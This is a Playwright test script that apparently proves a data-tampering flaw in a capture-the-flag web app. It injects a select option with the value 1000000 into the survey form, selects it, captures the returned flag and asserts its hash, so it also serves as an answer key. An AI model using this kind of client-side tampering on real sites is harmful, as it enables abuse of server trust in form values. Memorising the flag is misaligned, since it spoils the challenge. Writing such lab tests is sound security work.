const { test, expect } = require('@playwright/test');

test('Data Tampering Vulnerability', async ({ page }) => {
  // Navigate to the survey page
  await page.goto('/index.php?page=survey');
  
  // Highlight the survey form
  const selectElement = await page.locator('select[name="valeur"]').first();
  await selectElement.evaluate(node => {
    node.style.border = '2px solid red';
    node.style.padding = '5px';
  });
  
  // Wait to highlight the form element
  await page.waitForTimeout(2000);
  
  // Take screenshot before modification
  await page.screenshot({ path: 'reports/data-tampering-before.png' });
  
  // Show the original options
  await page.evaluate(() => {
    const select = document.querySelector('select[name="valeur"]');
    
    // Create a div to display original options
    const optionsDisplay = document.createElement('div');
    optionsDisplay.style.position = 'fixed';
    optionsDisplay.style.top = '10px';
    optionsDisplay.style.right = '10px';
    optionsDisplay.style.padding = '10px';
    optionsDisplay.style.backgroundColor = '#f0f0f0';
    optionsDisplay.style.border = '2px solid blue';
    optionsDisplay.style.zIndex = '9999';
    
    // Title for the display
    const title = document.createElement('div');
    title.textContent = 'Original Select Options:';
    title.style.fontWeight = 'bold';
    title.style.marginBottom = '10px';
    optionsDisplay.appendChild(title);
    
    // Add all original options
    Array.from(select.options).forEach((option, index) => {
      const optText = document.createElement('div');
      optText.textContent = `Option ${index+1}: value="${option.value}" (${option.text})`;
      optionsDisplay.appendChild(optText);
    });
    
    document.body.appendChild(optionsDisplay);
  });
  
  // Wait to show the original options
  await page.waitForTimeout(2000);
  
  // Add a new option with a tampered value
  await page.evaluate(() => {
    const select = document.querySelector('select[name="valeur"]');
    
    // Create a new option with a very large value
    const newOption = document.createElement('option');
    newOption.value = '1000000';
    newOption.text = 'Tampered Value (1000000)';
    newOption.style.backgroundColor = '#ff9999';
    select.appendChild(newOption);
    
    // Add to the display
    const optionsDisplay = document.querySelector('div[style*="position: fixed"]');
    if (optionsDisplay) {
      const newOptText = document.createElement('div');
      newOptText.textContent = `New Option: value="${newOption.value}" (${newOption.text})`;
      newOptText.style.color = 'red';
      newOptText.style.fontWeight = 'bold';
      newOptText.style.marginTop = '10px';
      optionsDisplay.appendChild(newOptText);
    }
  });
  
  // Wait to show the tampered option
  await page.waitForTimeout(2000);
  
  // Take screenshot after adding the tampered option
  await page.screenshot({ path: 'reports/data-tampering-modified.png' });
  
  // Select the tampered value
  await page.selectOption('select[name="valeur"]', '1000000');
  
  
  // Wait for the flag to appear
  await page.waitForSelector('h2:has-text("The flag is")');
  
  // Highlight the flag
  const flagElement = await page.locator('h2:has-text("The flag is")');
  await flagElement.evaluate(node => {
    node.style.backgroundColor = '#FFFF00';
    node.style.padding = '10px';
    node.style.border = '2px solid green';
  });
  
  // Take screenshot of the flag
  await page.screenshot({ path: 'reports/data-tampering-flag.png' });
  
  // Extract the flag
  const flagText = await flagElement.textContent();
  console.log('FLAG FOUND:', flagText.trim());
  
  // Verify the flag is correct
  expect(flagText).toContain('03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa');
});